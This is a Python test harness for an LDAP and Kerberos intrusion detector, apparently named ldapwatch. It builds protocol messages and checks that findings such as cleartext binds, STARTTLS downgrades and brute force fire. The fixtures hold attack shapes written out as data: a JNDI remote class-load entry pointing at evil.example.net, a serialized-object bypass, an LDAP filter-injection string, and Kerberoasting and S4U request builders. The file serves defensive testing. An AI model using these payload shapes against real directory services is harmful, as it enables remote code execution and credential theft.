#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Self-test harness for ldapwatch.

Every check fabricates a real BER-encoded LDAPMessage and pushes it through the
*production* code path — FlowManager reassembly -> dissect_message -> LDAPEngine
-> JSONLEmitter — then asserts on the findings that come out. No mocks of the
parser or engine: the same bytes a Pi would see on the wire are what we feed in.

Run:  python3 test_ldapwatch.py   (or:  python3 ldapwatch.py --selftest)
"""

import hashlib
import io
import ipaddress
import json
import os
import re
import sys

import ldapwatch as L


# --------------------------------------------------------------------------- #
# Minimal BER encoder (test-side only; production never encodes anything)
# --------------------------------------------------------------------------- #

def enc_len(n):
    if n < 0x80:
        return bytes([n])
    body = b""
    while n:
        body = bytes([n & 0xFF]) + body
        n >>= 8
    return bytes([0x80 | len(body)]) + body


def tlv(tag, content):
    return bytes([tag]) + enc_len(len(content)) + content


def enc_uint(n, tag=0x02):
    """Encode a small non-negative INTEGER/ENUMERATED (LDAP uses these for
    version, scope, result codes, message IDs)."""
    if n == 0:
        return tlv(tag, b"\x00")
    length = (n.bit_length() + 8) // 8         # keep a leading zero when needed
    return tlv(tag, n.to_bytes(length, "big"))


def octet(s, tag=0x04):
    if isinstance(s, str):
        s = s.encode("utf-8")
    return tlv(tag, s)


def seq(*parts, tag=0x30):
    return tlv(tag, b"".join(parts))


def ldap_message(message_id, protocol_op):
    return seq(enc_uint(message_id), protocol_op)


def ldap_message_wide_mid(mid_bytes, protocol_op):
    """LDAPMessage whose messageID INTEGER is encoded at an explicit byte width.

    Conforming encoders emit the minimum width; LDAPNightmare (CVE-2024-49112 /
    CVE-2024-49113) widens it to 4 bytes so that bits at/above 25 survive into
    wldap32's lm_referral. The test encoder must therefore be able to produce a
    non-minimal width on purpose.
    """
    return seq(tlv(0x02, mid_bytes), protocol_op)


def result_referral(*uris, result_code=None):
    """searchResDone carrying resultCode=referral(10) and chaseable LDAP URLs."""
    rc = L.RESULT_REFERRAL if result_code is None else result_code
    parts = [enc_uint(rc, tag=0x0A), octet(""), octet("")]
    if uris:
        parts.append(tlv(0xA3, b"".join(octet(u) for u in uris)))
    return tlv(0x65, b"".join(parts))


def nested_filter(depth, inner=None):
    """Wrap an equality filter in `depth` layers of AND — the CVE-2020-12243 shape."""
    f = inner if inner is not None else f_equality("uid", "x")
    for _ in range(depth):
        f = tlv(0xA0, f)
    return f


# ---- protocolOp builders --------------------------------------------------- #

def bind_request(version, name, *, simple=None, sasl_mech=None, sasl_creds=None):
    parts = [enc_uint(version), octet(name)]
    if simple is not None:
        parts.append(octet(simple, tag=0x80))                 # [0] simple
    elif sasl_mech is not None:
        inner = octet(sasl_mech)
        if sasl_creds is not None:
            inner += octet(sasl_creds)
        parts.append(tlv(0xA3, inner))                        # [3] SaslCredentials
    return tlv(0x60, b"".join(parts))                         # [APPLICATION 0]


def bind_response(result_code, referrals=None):
    parts = [enc_uint(result_code, tag=0x0A), octet(""), octet("")]
    if referrals:
        parts.append(tlv(0xA3, b"".join(octet(u) for u in referrals)))
    return tlv(0x61, b"".join(parts))                         # [APPLICATION 1]


# Filter builders (context-tagged CHOICE).
def f_present(attr):
    return octet(attr, tag=0x87)                              # [7] present (primitive)


def f_equality(attr, value):
    return tlv(0xA3, octet(attr) + octet(value))             # [3] equalityMatch


def f_substrings(attr, initial=None, any_=None, final=None):
    subs = b""
    if initial is not None:
        subs += octet(initial, tag=0x80)
    if any_ is not None:
        subs += octet(any_, tag=0x81)
    if final is not None:
        subs += octet(final, tag=0x82)
    return tlv(0xA4, octet(attr) + seq(subs))               # [4] substrings


def search_request(base, scope, filt, deref=0, size=0, tlim=0, types_only=False,
                   attributes=None):
    parts = [
        octet(base),
        enc_uint(scope, tag=0x0A),
        enc_uint(deref, tag=0x0A),
        enc_uint(size),
        enc_uint(tlim),
        tlv(0x01, b"\xFF" if types_only else b"\x00"),
        filt,
        seq(*[octet(a) for a in (attributes or ())]),         # AttributeSelection
    ]
    return tlv(0x63, b"".join(parts))                        # [APPLICATION 3]


def search_result_entry(object_name):
    return tlv(0x64, octet(object_name) + seq())            # [APPLICATION 4]


def search_result_entry_attrs(object_name, attrs):
    """searchResEntry carrying a PartialAttributeList: {name: [raw value bytes]}."""
    pal = b""
    for name, vals in attrs.items():
        valset = b"".join(tlv(0x04, v if isinstance(v, bytes) else v.encode()) for v in vals)
        pal += seq(octet(name) + tlv(0x31, valset))
    return tlv(0x64, octet(object_name) + seq(pal))


# --- Kerberos DER builders (hand-rolled, dep-free) ------------------------- #
# These deliberately do NOT use impacket: impacket is the INDEPENDENT oracle in
# the xcheck tier, so using it here too would recreate the shared-model blind
# spot that LESSON A exists to break. RFC 4120 uses EXPLICIT tagging, so every
# [n] field is a constructed context tag wrapping the real primitive.

def krb_ctx(n, inner):
    """EXPLICIT [n] wrapper."""
    return tlv(0xA0 | n, inner)


def krb_int(v):
    return enc_uint(v)


def krb_str(sv):
    """KerberosString is GeneralString (universal tag 27)."""
    return tlv(0x1B, sv.encode())


def krb_bitstring32(value):
    """32-bit BIT STRING: leading octet is the unused-bit count (0 here)."""
    return tlv(0x03, b"\x00" + value.to_bytes(4, "big"))


def krb_principal(name_type, parts):
    return seq(krb_ctx(0, krb_int(name_type))
               + krb_ctx(1, seq(b"".join(krb_str(p) for p in parts))))


def kdc_options(*bits):
    v = 0
    for b in bits:
        v |= 1 << (31 - b)
    return v


# The Windows-standard shape and the roasting shape, both VERIFIED against
# impacket's encoder: 0x40810000 and 0x40800000.
KDCOPT_WINDOWS = kdc_options(L.KDCOPT_FORWARDABLE, L.KDCOPT_RENEWABLE,
                             L.KDCOPT_CANONICALIZE)
KDCOPT_ROAST = kdc_options(L.KDCOPT_FORWARDABLE, L.KDCOPT_RENEWABLE)


def tgs_req(spn_parts, *, opts=KDCOPT_ROAST, etypes=(18,), cname="alice",
            realm="CORP.LOCAL", app_tag=L.KRB_TGS_REQ, msg_type=None,
            padata=(L.PA_TGS_REQ,), addl_tickets=0, nonce=12345):
    """Build a KDC-REQ.

    `padata` entries are either a bare type (dummy empty value) or a
    (type, value_bytes) pair, which is how the S4U structures are carried.
    """
    body = krb_ctx(0, krb_bitstring32(opts))
    if cname:
        body += krb_ctx(1, krb_principal(1, [cname]))
    body += krb_ctx(2, krb_str(realm))
    if spn_parts:
        body += krb_ctx(3, krb_principal(2, list(spn_parts)))
    body += krb_ctx(5, tlv(0x18, b"20370913024805Z"))        # till
    body += krb_ctx(7, krb_int(nonce))                        # nonce
    body += krb_ctx(8, seq(b"".join(krb_int(e) for e in etypes)))
    if addl_tickets:
        body += krb_ctx(11, seq(b"".join(fake_ticket() for _ in range(addl_tickets))))
    inner = krb_ctx(1, krb_int(5))
    inner += krb_ctx(2, krb_int(msg_type if msg_type is not None else app_tag))
    if padata:
        _pa = []
        for ent in padata:
            t, val = ent if isinstance(ent, tuple) else (ent, b"\x30\x00")
            _pa.append(seq(krb_ctx(1, krb_int(t)) + krb_ctx(2, tlv(0x04, val))))
        inner += krb_ctx(3, seq(b"".join(_pa)))
    inner += krb_ctx(4, seq(body))
    return tlv(0x60 | app_tag, seq(inner)) if app_tag < 31 else None


def as_req(cname="victim", *, padata=(L.PA_PAC_REQUEST,), spn=("krbtgt", "CORP.LOCAL"),
           opts=KDCOPT_WINDOWS, etypes=(18,)):
    return tgs_req(spn, opts=opts, etypes=etypes, cname=cname,
                   app_tag=L.KRB_AS_REQ, padata=padata)


def as_rep(cname="victim", *, enc_etype=23, realm="CORP.LOCAL"):
    """AS-REP. NOTE the KDC-REP tag numbering differs from KDC-REQ."""
    inner = krb_ctx(0, krb_int(5)) + krb_ctx(1, krb_int(L.KRB_AS_REP))
    inner += krb_ctx(3, krb_str(realm))
    inner += krb_ctx(4, krb_principal(1, [cname]))
    ticket = seq(krb_ctx(0, krb_int(5)) + krb_ctx(1, krb_str(realm))
                 + krb_ctx(2, krb_principal(2, ["krbtgt", realm]))
                 + krb_ctx(3, seq(krb_ctx(0, krb_int(18))
                                  + krb_ctx(2, tlv(0x04, b"\xAA" * 16)))))
    inner += krb_ctx(5, tlv(0x61, ticket))
    inner += krb_ctx(6, seq(krb_ctx(0, krb_int(enc_etype))
                            + krb_ctx(2, tlv(0x04, b"\xBB" * 32))))
    return tlv(0x60 | L.KRB_AS_REP, seq(inner))


def krb_error(code=L.KDC_ERR_PREAUTH_REQUIRED, cname="victim", realm="CORP.LOCAL"):
    inner = krb_ctx(0, krb_int(5)) + krb_ctx(1, krb_int(L.KRB_ERROR))
    inner += krb_ctx(4, tlv(0x18, b"20370913024805Z")) + krb_ctx(5, krb_int(1))
    inner += krb_ctx(6, krb_int(code))
    inner += krb_ctx(7, krb_str(realm)) + krb_ctx(8, krb_principal(1, [cname]))
    inner += krb_ctx(9, krb_str(realm))
    inner += krb_ctx(10, krb_principal(2, ["krbtgt", realm]))
    return tlv(0x60 | L.KRB_ERROR, seq(inner))


def krb_sint(v):
    """DER INTEGER that can be NEGATIVE -- KERB_CHECKSUM_HMAC_MD5 is -138."""
    n = max(1, ((v + (1 << 31)).bit_length() + 8) // 8) if v < 0 else None
    if v >= 0:
        return krb_int(v)
    for width in range(1, 9):
        try:
            return tlv(0x02, v.to_bytes(width, "big", signed=True))
        except OverflowError:
            continue
    raise ValueError(v)


def krb_checksum(cktype, blob=b"\x11" * 16):
    """Checksum ::= SEQUENCE { cksumtype [0] Int32, checksum [1] OCTET STRING }"""
    return seq(krb_ctx(0, krb_sint(cktype)) + krb_ctx(1, tlv(0x04, blob)))


def pa_for_user(name="victim", realm="CORP.LOCAL",
                cksumtype=L.CKSUM_HMAC_MD5, auth_package="Kerberos"):
    """PA-FOR-USER (129) padata-value. Field order from MS-SFU, numbering
    verified against impacket's PA_FOR_USER_ENC."""
    body = krb_ctx(0, krb_principal(1, [name])) + krb_ctx(1, krb_str(realm))
    body += krb_ctx(2, krb_checksum(cksumtype)) + krb_ctx(3, krb_str(auth_package))
    return seq(body)


def pa_s4u_x509_user(name="victim", realm="CORP.LOCAL",
                     cksumtype=L.CKSUM_RSA_MD4, cert=False, nonce=4242):
    """PA-S4U-X509-USER (130) padata-value.

    SEQUENCE { user-id [0] S4UUserID, checksum [1] Checksum }, with S4UUserID
    numbering verified against impacket's S4UUserID.
    """
    uid = krb_ctx(0, krb_int(nonce))
    if name:
        uid += krb_ctx(1, krb_principal(1, [name]))
    uid += krb_ctx(2, krb_str(realm))
    if cert:
        uid += krb_ctx(3, tlv(0x04, b"\x30\x82\x01\x00FAKECERT"))
    return seq(krb_ctx(0, seq(uid)) + krb_ctx(1, krb_checksum(cksumtype)))


def fake_ticket(realm="CORP.LOCAL", spn=("cifs", "fs1.corp.local")):
    """A Ticket, opaque to us: only its PRESENCE in additional-tickets matters."""
    return tlv(0x61, seq(krb_ctx(0, krb_int(5)) + krb_ctx(1, krb_str(realm))
                         + krb_ctx(2, krb_principal(2, list(spn)))
                         + krb_ctx(3, seq(krb_ctx(0, krb_int(18))
                                          + krb_ctx(2, tlv(0x04, b"\xCC" * 16))))))


def krb_tcp(msg):
    """RFC 4120 s7.2.2 TCP framing: 4-octet big-endian length prefix."""
    return len(msg).to_bytes(4, "big") + msg


def jndi_reference_entry(dn="cn=Exploit,dc=x", *, codebase="http://evil.example.net:8080/",
                         factory="Exploit", classname="foo.Bar",
                         oc=b"javaNamingReference", codebase_attr=b"javaCodeBase"):
    """marshalsec / JNDIExploit response shape: remote class load (RFC 2713)."""
    attrs = {"objectClass": [oc], "javaClassName": [classname.encode()]}
    if codebase is not None:
        attrs[codebase_attr.decode()] = [codebase.encode()]
    if factory is not None:
        attrs["javaFactory"] = [factory.encode()]
    return search_result_entry_attrs(dn, attrs)


def jndi_serialized_entry(dn="cn=Ser,dc=x", *, blob=None, magic=True, size=512,
                          classname="foo.Bar"):
    """javaSerializedObject shape; `magic=False` builds a non-serialized value."""
    if blob is None:
        head = L.JAVA_SERIAL_MAGIC if magic else b"\x00\x01\x02\x03"
        blob = head + b"\x73\x72\x00" + b"A" * max(0, size - len(head) - 3)
    return search_result_entry_attrs(dn, {
        "objectClass": [b"javaSerializedObject"],
        "javaClassName": [classname.encode()],
        "javaSerializedData": [blob],
    })


def jndi_local_factory_entry(dn="cn=Local,dc=x", factory="org.apache.naming.factory.BeanFactory"):
    """Local-factory bypass: a naming reference with NO codebase (R3 shape)."""
    return search_result_entry_attrs(dn, {
        "objectClass": [b"javaNamingReference"],
        "javaClassName": [b"javax.el.ELProcessor"],
        "javaFactory": [factory.encode()],
        "javaReferenceAddress": [b"$%7BEL%7D"],
    })


def ordinary_entry(dn="cn=alice,ou=people,dc=corp,dc=local"):
    """An everyday AD/OpenLDAP user entry -- the primary negative."""
    return search_result_entry_attrs(dn, {
        "objectClass": [b"top", b"person", b"organizationalPerson", b"user"],
        "cn": [b"alice"], "sAMAccountName": [b"alice"],
        "memberOf": [b"CN=Staff,OU=Groups,DC=corp,DC=local"],
    })


def rfc1035_name(name):
    """Encode a DNS name in RFC 1035 label form, as netlogon responses carry it."""
    out = b""
    for label in name.split("."):
        out += bytes([len(label)]) + label.encode()
    return out + b"\x00"


def netlogon_response(forest, domain, host, *, legacy=False):
    """Build a NETLOGON_SAM_LOGON_RESPONSE[_EX] blob with the given DNS names."""
    if legacy:
        b = (L.NETLOGON_SAM_LOGON_RESPONSE).to_bytes(2, "little")
        for u in ("\\\\DC1", "", "CORP"):
            b += u.encode("utf-16-le") + b"\x00\x00"
        b += b"\x11" * 16
    else:
        b = (L.NETLOGON_SAM_LOGON_RESPONSE_EX).to_bytes(2, "little")
        b += b"\x00\x00" + b"\x00" * 4 + b"\x11" * 16
    return b + rfc1035_name(forest) + rfc1035_name(domain) + rfc1035_name(host)


def ntver_filter(ntver):
    """CLDAP DC-locator NtVer equality assertion (4-byte little-endian)."""
    return f_equality("NtVer", ntver.to_bytes(4, "little").decode("latin-1"))


def search_result_done(result_code=0):
    return tlv(0x65, enc_uint(result_code, tag=0x0A) + octet("") + octet(""))


def search_result_ref(*uris):
    return tlv(0x73, b"".join(octet(u) for u in uris))      # [APPLICATION 19]


def extended_request(oid, value=None):
    parts = [octet(oid, tag=0x80)]                          # [0] requestName
    if value is not None:
        parts.append(octet(value, tag=0x81))               # [1] requestValue
    return tlv(0x77, b"".join(parts))                       # [APPLICATION 23]


def extended_response(result_code, response_name=None):
    parts = [enc_uint(result_code, tag=0x0A), octet(""), octet("")]
    if response_name is not None:
        parts.append(octet(response_name, tag=0x8A))        # [10] responseName
    return tlv(0x78, b"".join(parts))                       # [APPLICATION 24]


def partial_attr(name, vals):
    """PartialAttribute ::= SEQUENCE { type AttributeDescription, vals SET OF }"""
    body = b"".join(octet(v) if isinstance(v, str) else tlv(0x04, v) for v in vals)
    return seq(octet(name) + tlv(0x31, body))


def modify_request(dn, changes=()):
    """ModifyRequest. `changes` entries are (op, attr, [vals]) with op one of
    "add"/"delete"/"replace", or the raw ENUMERATED int."""
    body = b""
    for op, attr, vals in changes:
        n = {"add": 0, "delete": 1, "replace": 2}.get(op, op)
        body += seq(tlv(0x0A, bytes([n])) + partial_attr(attr, vals))
    return tlv(0x66, octet(dn) + seq(body))                # [APPLICATION 6]


def add_request(dn, attrs=()):
    """AddRequest. `attrs` entries are (attr, [vals])."""
    body = b"".join(partial_attr(a_, v_) for a_, v_ in attrs)
    return tlv(0x68, octet(dn) + seq(body))                # [APPLICATION 8]


def del_request(dn):
    return tlv(0x4A, dn.encode())                          # [APPLICATION 10] (primitive)


# --------------------------------------------------------------------------- #
# Test driver
# --------------------------------------------------------------------------- #

CLIENT = ("10.10.0.5", 45000)
SERVER = ("10.10.0.10", 389)
LOCAL_NETS = ["10.10.0.0/16"]


class Harness:
    def __init__(self):
        self.passed = 0
        self.failed = 0
        self.fails = []

    def check(self, name, cond):
        if cond:
            self.passed += 1
        else:
            self.failed += 1
            self.fails.append(name)

    # Feed one or more (direction, payload) steps through a fresh session and
    # return the list of finding-code strings emitted, in order.
    def run_krb(self, steps, ts0=1000.0, config=None, client="10.10.0.5",
                kdc="10.10.0.10", proto="udp", ldap_steps=None):
        """Drive the Kerberos plane. `steps` are (direction, message) pairs where
        direction is 'c2s' (client->KDC) or 's2c'. `ldap_steps` run first on the
        LDAP plane through the SAME FlowManager, which is how the SPN-enumeration
        correlation is exercised."""
        cfg = config if config is not None else L.Config()
        if not cfg.local_nets:
            cfg.local_nets = [ipaddress.ip_network(n) for n in LOCAL_NETS]
        engine = L.LDAPEngine(cfg)
        captured = []

        class _Sink:
            def emit(self, rec):
                captured.append(rec)

        flows = L.FlowManager(cfg, engine, _Sink())
        ts = ts0
        for direction, payload in (ldap_steps or ()):
            if direction == "c2s":
                flows.handle_tcp(ts, client, 45000, kdc, 389, payload, flags=0x18)
            else:
                flows.handle_tcp(ts, kdc, 389, client, 45000, payload, flags=0x18)
            ts += 0.01
        port = L.KRB_PORT
        for direction, msg in steps:
            if direction == "c2s":
                src, sport, dst, dport = client, 51000, kdc, port
            else:
                src, sport, dst, dport = kdc, port, client, 51000
            if proto == "udp":
                flows.handle_krb_udp(ts, src, sport, dst, dport, msg)
            else:
                flows.handle_krb_tcp(ts, src, sport, dst, dport, krb_tcp(msg), 0x18)
            ts += 0.01
        return captured, [r["finding"] for r in captured]

    def run(self, steps, ts0=1000.0, cleartext=True, local=True, config=None,
            server_ip=None, server_port=None, client_ip=None, flags=0x18):
        cfg = config if config is not None else L.Config()
        if local and not cfg.local_nets:
            cfg.local_nets = [__import__("ipaddress").ip_network(n) for n in LOCAL_NETS]
        engine = L.LDAPEngine(cfg)
        captured = []

        class _Sink:
            def emit(self, rec):
                captured.append(rec)

        flows = L.FlowManager(cfg, engine, _Sink())
        server = SERVER if cleartext else (SERVER[0], 636)
        server = (server_ip or server[0], server_port or server[1])
        client = (client_ip or CLIENT[0], CLIENT[1])
        ts = ts0
        for step in steps:
            direction, payload = step[0], step[1]
            step_flags = step[2] if len(step) > 2 else flags
            if direction == "c2s":
                src, sport, dst, dport = client[0], client[1], server[0], server[1]
            else:
                src, sport, dst, dport = server[0], server[1], client[0], client[1]
            flows.handle_tcp(ts, src, sport, dst, dport, payload, flags=step_flags)
            ts += 0.01
        return captured, [r["finding"] for r in captured]

    def run_udp(self, packets, ts0=2000.0):
        cfg = L.Config()
        engine = L.LDAPEngine(cfg)
        captured = []

        class _Sink:
            def emit(self, rec):
                captured.append(rec)

        flows = L.FlowManager(cfg, engine, _Sink())
        ts = ts0
        for (src, sport, dst, dport, payload) in packets:
            flows.handle_cldap(ts, src, sport, dst, dport, payload)
            ts += 0.01
        return captured, [r["finding"] for r in captured]


def sev_of(recs, code):
    for r in recs:
        if r["finding"] == code:
            return r["severity"]
    return None


def run_selftest():
    h = Harness()

    # ---- BER codec fundamentals ------------------------------------------ #
    el, nxt = L.ber_read(seq(octet("abc"), enc_uint(5)))
    h.check("ber: top is SEQUENCE", el.cls == 0 and el.tag == 16 and el.constructed)
    kids = L.ber_children(el.value)
    h.check("ber: two children", len(kids) == 2)
    h.check("ber: octet decodes", L.as_text(kids[0].value) == "abc")
    h.check("ber: int decodes", L.ber_int(kids[1].value) == 5)

    # long-form length (>127 bytes of content)
    big = octet("A" * 200)
    ebig, _ = L.ber_read(big)
    h.check("ber: long-form length", ebig.length == 200 and ebig.header_len == 3)

    # ber_peek must report None on an incomplete header
    h.check("ber: peek incomplete header", L.ber_peek(b"\x30", 0) is None)
    # truncated content must raise, not crash
    try:
        L.ber_read(b"\x04\x05ab")          # declares 5 bytes, only 2 present
        h.check("ber: truncated raises", False)
    except L.BERError:
        h.check("ber: truncated raises", True)
    # indefinite length is illegal in LDAP
    try:
        L.ber_read(b"\x30\x80\x00\x00")
        h.check("ber: indefinite rejected", False)
    except L.BERError:
        h.check("ber: indefinite rejected", True)

    # ---- Dissector: round-trip a bind request ---------------------------- #
    m = L.dissect_message(ldap_message(1, bind_request(3, "cn=admin,dc=x", simple="pw")))
    h.check("dissect: message id", m.message_id == 1)
    h.check("dissect: op name", m.op_name == "bindRequest")
    h.check("dissect: bind version", m.op["version"] == 3)
    h.check("dissect: bind dn", m.op["name"] == "cn=admin,dc=x")
    h.check("dissect: simple password", m.op["password"] == b"pw")

    # ---- T1: cleartext simple bind --------------------------------------- #
    recs, codes = h.run([("c2s", ldap_message(1, bind_request(3, "cn=admin,dc=corp", simple="S3cr3t!")))])
    h.check("T1: cleartext simple bind fires", "LDAP-CLEARTEXT-SIMPLE-BIND" in codes)
    h.check("T1: also no-starttls-bind", "LDAP-NO-STARTTLS-BIND" in codes)
    h.check("T1: severity critical", sev_of(recs, "LDAP-CLEARTEXT-SIMPLE-BIND") == "critical")
    h.check("T1: password not logged verbatim",
            all("S3cr3t!" not in json.dumps(r) for r in recs))
    h.check("T1: password_len recorded",
            any(r.get("detail", {}).get("password_len") == 7 for r in recs))

    # ---- T2: anonymous bind ---------------------------------------------- #
    recs, codes = h.run([("c2s", ldap_message(1, bind_request(3, "", simple="")))])
    h.check("T2: anonymous bind fires", "LDAP-ANONYMOUS-BIND" in codes)
    h.check("T2: no cleartext finding for empty pw", "LDAP-CLEARTEXT-SIMPLE-BIND" not in codes)
    h.check("T2: no unauth for empty dn", "LDAP-UNAUTH-BIND" not in codes)

    # ---- T3: unauthenticated bind (DN + empty pw) ------------------------ #
    recs, codes = h.run([("c2s", ldap_message(1, bind_request(3, "cn=svc,dc=corp", simple="")))])
    h.check("T3: unauthenticated bind fires", "LDAP-UNAUTH-BIND" in codes)
    h.check("T3: not cleartext (empty pw)", "LDAP-CLEARTEXT-SIMPLE-BIND" not in codes)
    h.check("T3: not anonymous (dn present)", "LDAP-ANONYMOUS-BIND" not in codes)

    # ---- T4: LDAPv2 bind -------------------------------------------------- #
    recs, codes = h.run([("c2s", ldap_message(1, bind_request(2, "cn=a,dc=corp", simple="pw")))])
    h.check("T4: deprecated version fires", "LDAP-DEPRECATED-VERSION" in codes)
    h.check("T4: cleartext still fires", "LDAP-CLEARTEXT-SIMPLE-BIND" in codes)

    # ---- T5: SASL PLAIN without TLS -------------------------------------- #
    recs, codes = h.run([("c2s", ldap_message(1, bind_request(3, "", sasl_mech="PLAIN",
                                                              sasl_creds="\x00user\x00pass")))])
    h.check("T5: SASL PLAIN no-TLS fires", "LDAP-SASL-PLAIN-NO-TLS" in codes)
    h.check("T5: no-starttls-bind fires", "LDAP-NO-STARTTLS-BIND" in codes)

    # ---- T6: weak SASL mechanism ----------------------------------------- #
    recs, codes = h.run([("c2s", ldap_message(1, bind_request(3, "", sasl_mech="DIGEST-MD5")))])
    h.check("T6: weak SASL mech fires", "LDAP-WEAK-SASL-MECH" in codes)

    # ---- T7: GSSAPI (strong) should NOT trip cleartext/no-starttls ------- #
    recs, codes = h.run([("c2s", ldap_message(1, bind_request(3, "", sasl_mech="GSSAPI")))])
    h.check("T7: GSSAPI no cleartext finding", "LDAP-SASL-PLAIN-NO-TLS" not in codes)
    h.check("T7: GSSAPI no no-starttls finding", "LDAP-NO-STARTTLS-BIND" not in codes)
    h.check("T7: GSSAPI no weak finding", "LDAP-WEAK-SASL-MECH" not in codes)

    # ---- T8: simple bind AFTER successful STARTTLS ----------------------- #
    steps = [
        ("c2s", ldap_message(1, extended_request(L.OID_STARTTLS))),
        ("s2c", ldap_message(1, extended_response(0, response_name=L.OID_STARTTLS))),
        # In reality bytes are now TLS; feeding a bind here must be ignored (tls_active).
        ("c2s", ldap_message(2, bind_request(3, "cn=a,dc=corp", simple="pw"))),
    ]
    recs, codes = h.run(steps)
    h.check("T8: STARTTLS negotiated fires", "LDAP-STARTTLS-OK" in codes)
    h.check("T8: no cleartext bind after TLS", "LDAP-CLEARTEXT-SIMPLE-BIND" not in codes)
    h.check("T8: no downgrade on success", "LDAP-STARTTLS-DOWNGRADE" not in codes)

    # ---- T9: STARTTLS refused -> downgrade ------------------------------- #
    steps = [
        ("c2s", ldap_message(1, extended_request(L.OID_STARTTLS))),
        ("s2c", ldap_message(1, extended_response(L.RESULT_UNWILLING_TO_PERFORM))),
    ]
    recs, codes = h.run(steps)
    h.check("T9: STARTTLS refusal -> downgrade", "LDAP-STARTTLS-DOWNGRADE" in codes)

    # ---- T10: STARTTLS strip (cleartext bind after request, no response) - #
    steps = [
        ("c2s", ldap_message(1, extended_request(L.OID_STARTTLS))),
        ("c2s", ldap_message(2, bind_request(3, "cn=a,dc=corp", simple="pw"))),
    ]
    recs, codes = h.run(steps)
    h.check("T10: strip -> downgrade", "LDAP-STARTTLS-DOWNGRADE" in codes)
    h.check("T10: cleartext bind still visible", "LDAP-CLEARTEXT-SIMPLE-BIND" in codes)

    # ---- T11: RootDSE probe ---------------------------------------------- #
    recs, codes = h.run([("c2s", ldap_message(1, search_request("", L.SCOPE_BASE, f_present("objectClass"))))])
    h.check("T11: RootDSE probe fires", "LDAP-ROOTDSE-PROBE" in codes)

    # ---- T12: whole-subtree enumeration ---------------------------------- #
    recs, codes = h.run([("c2s", ldap_message(1, search_request("dc=corp,dc=com", L.SCOPE_SUBTREE, f_present("objectClass"))))])
    h.check("T12: subtree enum fires", "LDAP-WHOLE-SUBTREE-ENUM" in codes)

    # ---- T13: narrow search must NOT fire enum --------------------------- #
    recs, codes = h.run([("c2s", ldap_message(1, search_request("dc=corp,dc=com", L.SCOPE_ONELEVEL, f_equality("uid", "jdoe"))))])
    h.check("T13: narrow search no enum", "LDAP-WHOLE-SUBTREE-ENUM" not in codes)
    h.check("T13: narrow search no injection", "LDAP-INJECTION-FILTER" not in codes)
    h.check("T13: narrow search no rootdse", "LDAP-ROOTDSE-PROBE" not in codes)

    # ---- T14: filter injection (unescaped parens in a value) ------------- #
    recs, codes = h.run([("c2s", ldap_message(1, search_request("dc=corp,dc=com", L.SCOPE_SUBTREE,
                                                                f_equality("uid", "x)(uid=*))(|(uid=*"))))])
    h.check("T14: injection filter fires", "LDAP-INJECTION-FILTER" in codes)

    # ---- T14b: NUL byte in value ----------------------------------------- #
    recs, codes = h.run([("c2s", ldap_message(1, search_request("dc=corp", L.SCOPE_ONELEVEL,
                                                                f_equality("cn", "a\x00b"))))])
    h.check("T14b: NUL in value -> injection", "LDAP-INJECTION-FILTER" in codes)

    # ---- T14c: substrings wildcard is legitimate, must NOT fire ---------- #
    recs, codes = h.run([("c2s", ldap_message(1, search_request("dc=corp", L.SCOPE_ONELEVEL,
                                                                f_substrings("cn", initial="jo", final="doe"))))])
    h.check("T14c: legit substrings no injection", "LDAP-INJECTION-FILTER" not in codes)

    # ---- T15: Password Modify without TLS -------------------------------- #
    recs, codes = h.run([("c2s", ldap_message(1, extended_request(L.OID_PASSWORD_MODIFY, value="newpw")))])
    h.check("T15: passwd-modify no-TLS fires", "LDAP-PASSWORD-MODIFY-NO-TLS" in codes)
    h.check("T15: severity critical", sev_of(recs, "LDAP-PASSWORD-MODIFY-NO-TLS") == "critical")

    # ---- T15b: Password Modify AFTER STARTTLS must NOT fire -------------- #
    steps = [
        ("c2s", ldap_message(1, extended_request(L.OID_STARTTLS))),
        ("s2c", ldap_message(1, extended_response(0, response_name=L.OID_STARTTLS))),
        ("c2s", ldap_message(2, extended_request(L.OID_PASSWORD_MODIFY, value="newpw"))),
    ]
    recs, codes = h.run(steps)
    h.check("T15b: passwd-modify silent under TLS", "LDAP-PASSWORD-MODIFY-NO-TLS" not in codes)

    # ---- T16: Who Am I without TLS --------------------------------------- #
    recs, codes = h.run([("c2s", ldap_message(1, extended_request(L.OID_WHOAMI)))])
    h.check("T16: whoami no-TLS fires", "LDAP-WHOAMI-NO-TLS" in codes)

    # ---- T17: write op (modify) without TLS ------------------------------ #
    recs, codes = h.run([("c2s", ldap_message(1, modify_request("cn=a,dc=corp")))])
    h.check("T17: modify no-TLS fires", "LDAP-MODIFY-NO-TLS" in codes)
    recs, codes = h.run([("c2s", ldap_message(1, add_request("cn=b,dc=corp")))])
    h.check("T17: add no-TLS fires", "LDAP-MODIFY-NO-TLS" in codes)
    recs, codes = h.run([("c2s", ldap_message(1, del_request("cn=c,dc=corp")))])
    h.check("T17: del no-TLS fires", "LDAP-MODIFY-NO-TLS" in codes)

    # ---- T18: brute force (5 invalidCredentials in window) --------------- #
    steps = [("s2c", ldap_message(i, bind_response(L.RESULT_INVALID_CREDENTIALS))) for i in range(1, 6)]
    recs, codes = h.run(steps)
    h.check("T18: brute force fires at threshold", "LDAP-BIND-BRUTE-FORCE" in codes)
    # 4 failures should NOT trip it
    steps4 = [("s2c", ldap_message(i, bind_response(L.RESULT_INVALID_CREDENTIALS))) for i in range(1, 5)]
    recs4, codes4 = h.run(steps4)
    h.check("T18: 4 failures stay quiet", "LDAP-BIND-BRUTE-FORCE" not in codes4)

    # ---- T19: external referral ------------------------------------------ #
    recs, codes = h.run([("s2c", ldap_message(1, search_result_ref("ldap://evil.example.net/dc=x")))])
    h.check("T19: external referral fires", "LDAP-EXTERNAL-REFERRAL" in codes)
    # internal referral (within local net host) should NOT fire
    recs2, codes2 = h.run([("s2c", ldap_message(1, search_result_ref("ldap://10.10.0.20/dc=x")))])
    h.check("T19: internal referral stays quiet", "LDAP-EXTERNAL-REFERRAL" not in codes2)

    # ---- T20: large search result ---------------------------------------- #
    steps = [("s2c", ldap_message(1, search_result_entry(f"cn=u{i},dc=corp"))) for i in range(200)]
    recs, codes = h.run(steps)
    h.check("T20: large result fires", "LDAP-LARGE-SEARCH-RESULT" in codes)
    h.check("T20: fires exactly once", codes.count("LDAP-LARGE-SEARCH-RESULT") == 1)

    # ---- T21: TCP reassembly — two messages in one segment --------------- #
    two = ldap_message(1, bind_request(3, "cn=a,dc=corp", simple="pw")) + \
          ldap_message(2, search_request("", L.SCOPE_BASE, f_present("objectClass")))
    recs, codes = h.run([("c2s", two)])
